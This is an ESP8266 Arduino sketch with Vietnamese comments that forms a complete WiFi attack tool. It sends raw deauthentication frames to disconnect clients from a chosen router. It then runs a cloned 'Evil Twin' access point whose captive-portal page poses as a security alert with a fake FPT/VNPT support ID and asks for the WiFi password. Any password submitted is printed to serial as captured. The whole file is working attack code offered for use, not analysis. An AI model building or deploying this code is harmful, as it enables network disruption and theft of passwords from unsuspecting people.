#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>

extern "C" {
  #include "user_interface.h"
}

// --- CẤU HÌNH ---
const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

int currentMode = 0; // 0: Idle, 1: Evil Twin, 2: Deauth
String targetSSID = "WiFi_Bao_Tri_He_Thong";
int targetChannel = 1;
uint8_t target_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; // Mặc định Broadcast

// Hàm gửi gói tin Deauth
void sendDeauth() {
  uint8_t packet[26] = {
    0xC0, 0x00, 0x3a, 0x01, // Frame Control
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (All)
    target_mac[0], target_mac[1], target_mac[2], target_mac[3], target_mac[4], target_mac[5], // Source (Router thật)
    target_mac[0], target_mac[1], target_mac[2], target_mac[3], target_mac[4], target_mac[5], // BSSID (Router thật)
    0x00, 0x00, 0x01, 0x00 // Sequence
  };
  wifi_send_pkt_freedom(packet, sizeof(packet), 0);
}

// Hàm khởi tạo WiFi Bẫy (Evil Twin)
void startAP() {
  WiFi.softAPdisconnect();
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(targetSSID.c_str(), NULL, targetChannel);
  Serial.println("\n[+] Da tao WiFi bay: " + targetSSID + " (Kenh " + String(targetChannel) + ")");
}

// Hàm quét mạng
void scanWiFi() {
  Serial.println("\n[*] Dang quet WiFi...");
  int n = WiFi.scanNetworks();
  if (n == 0) Serial.println("Khong tim thay mang.");
  else {
    for (int i = 0; i < n; ++i) {
      Serial.printf("[%d] %s | Ch:%d | %s | %ddBm\n", i, WiFi.SSID(i).c_str(), WiFi.channel(i), WiFi.BSSIDstr(i).c_str(), WiFi.RSSI(i));
      delay(10);
    }
    Serial.println("--> Go 'x:SO_THU_TU' de chon muc tieu.");
  }
}

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_AP_STA);
  startAP();

  // Trang web lừa đảo
  String html = "<html><head><meta charset='utf-8'><meta name='viewport' content='width=device-width, initial-scale=1'></head>"
                "<body style='text-align:center;font-family:sans-serif;margin-top:50px;'>"
                "<h2>Hệ Thống Cảnh Báo Bảo Mật</h2>"
                "<p>Phát hiện truy cập bất thường. Vui lòng xác thực mật khẩu WiFi để mở khóa Internet.</p>"
                "<form action='/post' method='POST'>"
                "<input type='password' name='pw' style='padding:10px;width:80%;' placeholder='Nhập mật khẩu WiFi...'><br><br>"
                "<input type='submit' value='Xác Thực Ngay' style='padding:10px;background-color:red;color:white;border:none;'>"
                "</form><p style='color:grey;font-size:12px;'>Support ID: 8991-FPT-VNPT</p></body></html>";

  webServer.on("/", [html]() { webServer.send(200, "text/html", html); });
  
  webServer.on("/post", HTTP_POST, []() {
    String p = webServer.arg("pw");
    Serial.println("\n\n=================================");
    Serial.println("[!!!] HUP DUOC PASS: " + p);
    Serial.println("=================================\n");
    webServer.send(200, "text/html", "<h1 style='text-align:center;'>Dang kiem tra... Vui long cho 2 phut.</h1>");
  });

  dnsServer.start(DNS_PORT, "*", apIP);
  webServer.begin();
  wifi_promiscuous_enable(1); // Bật chế độ tiêm gói tin

  Serial.println("\n--- EVIL COMBO READY ---");
  Serial.println("Lenh: scan, x:ID, s:NAME, m1 (Twin), m2 (Deauth), stop");
}

void loop() {
  // Đọc lệnh từ App Serial
  if (Serial.available()) {
    String cmd = Serial.readStringUntil('\n');
    cmd.trim();

    if (cmd == "scan") { scanWiFi(); }
    else if (cmd == "m1") { currentMode = 1; Serial.println("-> Mode: EVIL TWIN (Tha thinh)"); }
    else if (cmd == "m2") { currentMode = 2; Serial.println("-> Mode: DEAUTH (Dam)"); }
    else if (cmd == "stop") { currentMode = 0; Serial.println("-> STOP All"); }
    else if (cmd.startsWith("s:")) { 
      targetSSID = cmd.substring(2); 
      startAP(); 
    }
    else if (cmd.startsWith("x:")) {
      int id = cmd.substring(2).toInt();
      if(id >= 0) {
        targetChannel = WiFi.channel(id);
        String bssid = WiFi.BSSIDstr(id);
        // Lưu MAC mục tiêu
        sscanf(bssid.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &target_mac[0], &target_mac[1], &target_mac[2], &target_mac[3], &target_mac[4], &target_mac[5]);
        wifi_set_channel(targetChannel);
        startAP(); // Khởi động lại AP trên kênh mới
        Serial.println("[+] Da khoa muc tieu: " + WiFi.SSID(id));
      }
    }
  }

  // Xử lý chế độ
  if (currentMode == 1) { // Evil Twin
    dnsServer.processNextRequest();
    webServer.handleClient();
  } 
  else if (currentMode == 2) { // Deauth
    // Gửi 10 gói rồi nghỉ xíu để còn nhận lệnh stop
    for(int k=0; k<10; k++) { sendDeauth(); delay(2); }
    webServer.handleClient(); 
  }
}
